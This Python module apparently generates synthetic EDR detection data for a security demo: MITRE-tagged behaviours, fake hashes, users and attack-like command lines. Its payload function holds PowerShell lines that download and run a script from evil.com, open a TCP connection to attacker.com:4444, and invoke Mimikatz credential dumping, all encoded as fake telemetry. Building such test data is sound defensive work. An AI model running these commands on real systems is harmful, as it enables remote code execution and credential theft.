"""
EDR Detection Generator for CyberDemo.

Generates realistic synthetic EDR (Endpoint Detection and Response) detection
data including behavioral detections, file-based detections, and command line
activity.
"""

import base64
import hashlib
import random
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from .constants import (
    ANCHOR_DETECTION_IDS,
    ANCHOR_HASHES,
    CMDLINE_TEMPLATES,
    EDR_SEVERITY_DISTRIBUTION,
    FIRST_NAMES,
    LAST_NAMES,
    MALICIOUS_FILENAMES,
    MALICIOUS_PATHS,
    MITRE_TECHNIQUES,
)


def _weighted_choice(rng: random.Random, weights: Dict[str, int]) -> str:
    """Make a weighted random choice from a dictionary of weights."""
    items = list(weights.keys())
    weight_values = list(weights.values())
    return rng.choices(items, weights=weight_values, k=1)[0]


def _generate_sha256(rng: random.Random) -> str:
    """Generate a random SHA256 hash."""
    return hashlib.sha256(str(rng.random()).encode()).hexdigest()


def _generate_encoded_payload(rng: random.Random) -> str:
    """Generate a base64 encoded PowerShell payload."""
    # Common malicious PowerShell snippets (simplified)
    payloads = [
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
        "$c=New-Object System.Net.Sockets.TCPClient('attacker.com',4444);",
        "Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden'",
        "Invoke-Mimikatz -DumpCreds",
        "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')",
    ]
    payload = rng.choice(payloads)
    # Base64 encode with UTF-16LE (PowerShell's expected encoding)
    encoded = base64.b64encode(payload.encode("utf-16le")).decode()
    return encoded


def _generate_c2_domain(rng: random.Random) -> str:
    """Generate a realistic C2 domain."""
    tlds = ["com", "net", "org", "io", "xyz", "top", "info"]
    words = ["update", "sync", "cdn", "api", "cloud", "secure", "auth", "service"]
    numbers = ["", "1", "2", "365", "24", "7"]

    word1 = rng.choice(words)
    word2 = rng.choice(words)
    num = rng.choice(numbers)
    tld = rng.choice(tlds)

    return f"{word1}{word2}{num}.{tld}"


def _generate_cmdline(rng: random.Random, technique_id: str) -> str:
    """Generate a realistic command line based on technique."""
    technique_info = MITRE_TECHNIQUES.get(technique_id, {})
    tactic = technique_info.get("tactic", "Execution")

    # Map tactics to cmdline template categories
    tactic_to_category = {
        "Execution": "powershell_encoded",
        "Persistence": "persistence",
        "Privilege Escalation": "powershell_encoded",
        "Defense Evasion": "defense_evasion",
        "Credential Access": "credential_theft",
        "Discovery": "discovery",
        "Lateral Movement": "lateral_movement",
        "Collection": "data_exfil",
        "Command and Control": "powershell_encoded",
        "Exfiltration": "data_exfil",
        "Impact": "defense_evasion",
    }

    category = tactic_to_category.get(tactic, "powershell_encoded")
    templates = CMDLINE_TEMPLATES.get(category, CMDLINE_TEMPLATES["powershell_encoded"])
    template = rng.choice(templates)

    # Fill in template variables
    user = f"{rng.choice(FIRST_NAMES).lower()}.{rng.choice(LAST_NAMES).lower()}"

    replacements = {
        "{encoded_payload}": _generate_encoded_payload(rng),
        "{url}": f"https://{_generate_c2_domain(rng)}/update.ps1",
        "{target_host}": f"SRV-{rng.choice(['NYC', 'LON', 'TKY'])}-{rng.randint(1, 100):03d}",
        "{command}": "whoami /all",
        "{password}": f"P@ss{rng.randint(1000, 9999)}!",
        "{malware_path}": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{rng.choice(MALICIOUS_FILENAMES)}",
        "{pid}": str(rng.randint(1000, 65535)),
        "{domain}": "CORP",
        "{user}": user,
        "{filepath}": f"C:\\Users\\{user}\\Documents\\confidential.docx",
        "{c2_domain}": _generate_c2_domain(rng),
    }

    cmdline = template
    for key, value in replacements.items():
        cmdline = cmdline.replace(key, value)

    return cmdline


def _generate_file_info(rng: random.Random, use_anchor_hash: bool = False, anchor_index: int = 0) -> Dict:
    """Generate file information for a detection."""
    user = f"{rng.choice(FIRST_NAMES).lower()}.{rng.choice(LAST_NAMES).lower()}"
    filename = rng.choice(MALICIOUS_FILENAMES)
    path_template = rng.choice(MALICIOUS_PATHS)
    path = path_template.replace("{user}", user)

    if use_anchor_hash and anchor_index < len(ANCHOR_HASHES):
        sha256 = ANCHOR_HASHES[anchor_index]
    else:
        sha256 = _generate_sha256(rng)

    return {
        "sha256": sha256,
        "path": f"{path}{filename}",
        "name": filename,
    }


def _generate_behavior(rng: random.Random) -> Dict:
    """Generate behavior information based on MITRE ATT&CK."""
    technique_id = rng.choice(list(MITRE_TECHNIQUES.keys()))
    technique_info = MITRE_TECHNIQUES[technique_id]

    return {
        "technique_id": technique_id,
        "tactic": technique_info["tactic"],
        "description": technique_info["description"],
    }


def _generate_user(rng: random.Random) -> str:
    """Generate a username."""
    first = rng.choice(FIRST_NAMES).lower()
    last = rng.choice(LAST_NAMES).lower()

    # Different username formats
    formats = [
        f"{first}.{last}",
        f"{first[0]}{last}",
        f"{first}{last[0]}",
        f"{first}_{last}",
        f"CORP\\{first}.{last}",
    ]

    return rng.choice(formats)


def _generate_timestamp(rng: random.Random, days_back: int = 30) -> str:
    """Generate a timestamp within the specified range."""
    now = datetime.now()
    seconds_back = rng.randint(0, days_back * 24 * 3600)
    timestamp = now - timedelta(seconds=seconds_back)
    return timestamp.isoformat()


def generate_edr_detections(
    count: int = 1000,
    assets: Optional[List[Dict]] = None,
    seed: int = 42
) -> List[Dict]:
    """
    Generate synthetic EDR detection data.

    Args:
        count: Number of detections to generate (default 1000)
        assets: Optional list of assets to reference (if None, generates device IDs)
        seed: Random seed for reproducibility (default 42)

    Returns:
        List of detection dictionaries with complete detection information

    Example:
        >>> detections = generate_edr_detections(count=100, seed=42)
        >>> len(detections)
        100
        >>> detections[0].keys()
        dict_keys(['detection_id', 'asset_id', 'device_id', 'timestamp', ...])
    """
    rng = random.Random(seed)
    detections = []

    # Generate anchor detections first (with fixed IDs)
    for i, anchor_id in enumerate(ANCHOR_DETECTION_IDS):
        if assets:
            asset = rng.choice(assets)
            asset_id = asset["asset_id"]
            device_id = asset.get("hostname", f"DEVICE-{rng.randint(1000, 9999)}")
        else:
            asset_id = f"ASSET-{uuid.UUID(int=rng.getrandbits(128))}"
            device_id = f"DESKTOP-{rng.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{rng.randint(1000, 9999)}"

        behavior = _generate_behavior(rng)

        detection = {
            "detection_id": anchor_id,
            "asset_id": asset_id,
            "device_id": device_id,
            "timestamp": _generate_timestamp(rng, days_back=7),  # Recent
            "severity": "Critical",  # Anchor detections are critical
            "file": _generate_file_info(rng, use_anchor_hash=True, anchor_index=i),
            "behavior": behavior,
            "cmdline": _generate_cmdline(rng, behavior["technique_id"]),
            "user": _generate_user(rng),
        }
        detections.append(detection)

    # Generate remaining detections
    remaining_count = count - len(ANCHOR_DETECTION_IDS)

    for _ in range(remaining_count):
        # Select asset
        if assets:
            asset = rng.choice(assets)
            asset_id = asset["asset_id"]
            device_id = asset.get("hostname", f"DEVICE-{rng.randint(1000, 9999)}")
        else:
            asset_id = f"ASSET-{uuid.UUID(int=rng.getrandbits(128))}"
            device_id = f"DESKTOP-{rng.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{rng.randint(1000, 9999)}"

        # Generate detection ID
        detection_id = f"DET-{uuid.UUID(int=rng.getrandbits(128))}"

        # Select severity based on distribution
        severity = _weighted_choice(rng, EDR_SEVERITY_DISTRIBUTION)

        # Generate behavior
        behavior = _generate_behavior(rng)

        detection = {
            "detection_id": detection_id,
            "asset_id": asset_id,
            "device_id": device_id,
            "timestamp": _generate_timestamp(rng),
            "severity": severity,
            "file": _generate_file_info(rng),
            "behavior": behavior,
            "cmdline": _generate_cmdline(rng, behavior["technique_id"]),
            "user": _generate_user(rng),
        }

        detections.append(detection)

    return detections


def get_detections_by_severity(detections: List[Dict]) -> Dict[str, List[Dict]]:
    """
    Group detections by severity level.

    Args:
        detections: List of detection dictionaries

    Returns:
        Dictionary mapping severity levels to lists of detections
    """
    by_severity: Dict[str, List[Dict]] = {
        "Critical": [],
        "High": [],
        "Medium": [],
        "Low": [],
    }

    for detection in detections:
        severity = detection.get("severity", "Medium")
        if severity in by_severity:
            by_severity[severity].append(detection)

    return by_severity


def get_detections_by_technique(detections: List[Dict]) -> Dict[str, List[Dict]]:
    """
    Group detections by MITRE technique.

    Args:
        detections: List of detection dictionaries

    Returns:
        Dictionary mapping technique IDs to lists of detections
    """
    by_technique: Dict[str, List[Dict]] = {}

    for detection in detections:
        technique = detection.get("behavior", {}).get("technique_id", "unknown")
        if technique not in by_technique:
            by_technique[technique] = []
        by_technique[technique].append(detection)

    return by_technique


def get_anchor_detections(detections: List[Dict]) -> List[Dict]:
    """
    Get anchor detections (fixed test case IDs).

    Args:
        detections: List of detection dictionaries

    Returns:
        List of anchor detections
    """
    return [d for d in detections if d["detection_id"] in ANCHOR_DETECTION_IDS]


def get_critical_detections(detections: List[Dict]) -> List[Dict]:
    """
    Get all critical severity detections.

    Args:
        detections: List of detection dictionaries

    Returns:
        List of critical detections
    """
    return [d for d in detections if d.get("severity") == "Critical"]


if __name__ == "__main__":
    # Quick test
    from .gen_assets import generate_assets

    # Generate with assets
    assets = generate_assets(count=100, seed=42)
    detections = generate_edr_detections(count=100, assets=assets, seed=42)

    print(f"Generated {len(detections)} detections")

    by_severity = get_detections_by_severity(detections)
    for severity, sev_detections in by_severity.items():
        print(f"  {severity}: {len(sev_detections)}")

    anchor = get_anchor_detections(detections)
    print(f"\nAnchor detections: {len(anchor)}")
    for d in anchor:
        print(f"  {d['detection_id']}: {d['behavior']['technique_id']}")

    print("\nSample detection:")
    import json
    print(json.dumps(detections[0], indent=2, default=str))
